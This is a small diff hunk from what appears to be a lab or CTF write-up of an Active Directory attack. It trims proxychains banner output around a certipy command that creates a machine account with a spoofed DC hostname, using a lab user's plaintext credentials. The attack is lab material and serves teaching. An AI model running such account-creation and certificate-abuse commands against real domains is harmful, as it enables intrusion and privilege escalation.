@@ -396,9 +396,6 @@ Certificate Templates                   : [!] Could not find any certificate tem
 
 ```shell
 $ proxychains certipy account create -user 'TEST2$' -pass 'P@ssw0rd' -dns XR-DC01.xiaorang.lab -dc-ip 172.22.15.13 -u lixiuying -p 'winniethepooh'
-[proxychains] config file found: /usr/local/etc/proxychains.conf
-[proxychains] preloading /usr/local/lib/libproxychains4.dylib
-[proxychains] DLL init: proxychains-ng 4.16-git-13-g133e06b
 Certipy v4.7.0 - by Oliver Lyak (ly4k)
 
 [*] Creating new account:
